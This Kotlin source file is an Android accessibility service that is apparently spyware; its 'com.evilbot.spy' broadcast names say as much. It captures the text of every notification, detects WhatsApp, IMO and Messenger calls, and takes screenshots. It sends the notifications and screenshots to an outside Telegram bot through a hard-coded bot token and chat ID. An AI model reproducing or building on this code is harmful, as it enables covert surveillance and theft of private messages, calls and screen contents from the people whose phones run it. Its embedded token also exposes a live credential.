package com.luffa

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // 1. Notification State Changed Handling
        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val text = event.text?.joinToString(" ") ?: ""
            if (text.isNotBlank()) {
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
                        val chatId = "8820979221"
                        val ok = OkHttpClient()
                        val form = FormBody.Builder()
                            .add("chat_id", chatId)
                            .add("text", "Notification: $text")
                            .build()
                        ok.newCall(
                            Request.Builder()
                                .url("https://api.telegram.org/bot$token/sendMessage")
                                .post(form)
                                .build()
                        ).execute()
                    } catch (_: Exception) {}
                }
            }

            // 2. VoIP Call Detection (Notification ভিত্তিক)
            val packageName = event.packageName?.toString().orEmpty()
            val notifText = event.text?.joinToString(" ") ?: ""

            // শুধুমাত্র নির্দিষ্ট VoIP অ্যাপ অথবা নোটিফিকেশনে "call" শব্দ থাকলে চেক করবে
            val voipApps = listOf("com.whatsapp", "com.imo.android.imoim", "com.facebook.orca", "com.facebook.mlite")
            if (packageName in voipApps || notifText.contains("call", ignoreCase = true)) {
                if (notifText.contains(Regex("incoming|ongoing|active|call in progress|WhatsApp call|Messenger call|IMO call", RegexOption.IGNORE_CASE))) {
                    // কল শুরু হলে ব্রডকাস্ট পাঠানো
                    val intent = Intent("com.evilbot.spy.VOIP_CALL_START")
                    sendBroadcast(intent)
                } else if (notifText.contains(Regex("ended|missed|declined|call ended", RegexOption.IGNORE_CASE))) {
                    // কল শেষ হলে ব্রডকাস্ট পাঠানো
                    val intent = Intent("com.evilbot.spy.VOIP_CALL_END")
                    sendBroadcast(intent)
                }
            }
        }
    }

    override fun onInterrupt() {}

    // Screenshot method – Android 9+ only
    fun takeScreenshot(crop: Rect? = null) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            sendError("Screenshot not supported < P")
            return
        }
        val callback = object : TakeScreenshotCallback {
            override fun onSuccess(screenshotResult: ScreenshotResult) {
                val bitmap = Bitmap.wrapHardwareBuffer(
                    screenshotResult.hardwareBuffer,
                    screenshotResult.colorSpace
                ) ?: return
                val finalBitmap = if (crop != null) {
                    Bitmap.createBitmap(bitmap, crop.left, crop.top, crop.width(), crop.height())
                } else bitmap

                CoroutineScope(Dispatchers.IO).launch {
                    val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                    FileOutputStream(file).use { fos ->
                        finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos)
                    }
                    // Telegram-এর মাধ্যমে পাঠানো
                    try {
                        val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
                        val chatId = "8820979221"
                        val ok = OkHttpClient()
                        val body = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", chatId)
                            .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
                            .build()
                        ok.newCall(
                            Request.Builder()
                                .url("https://api.telegram.org/bot$token/sendPhoto")
                                .post(body)
                                .build()
                        ).execute()
                    } catch (e: Exception) {
                        Log.e("Accessibility", "Upload failed", e)
                    }
                }
            }
            override fun onFailure(errorCode: Int) {
                sendError("Screenshot failed with code $errorCode")
            }
        }
        takeScreenshot(
            android.os.Handler.createAsync(android.os.Looper.getMainLooper()).looper,
            java.util.concurrent.Executors.newSingleThreadExecutor(),
            callback
        )
    }

    private fun sendError(msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic" // আপনার টোকেন এখানে ব্যবহার করা হয়েছে
            val chatId = "8820979221"
            val ok = OkHttpClient()
            val form = FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", "Accessibility error: $msg")
                .build()
            ok.newCall(
                Request.Builder()
                    .url("https://api.telegram.org/bot$token/sendMessage")
                    .post(form)
                    .build()
            ).execute()
        }
    }
}
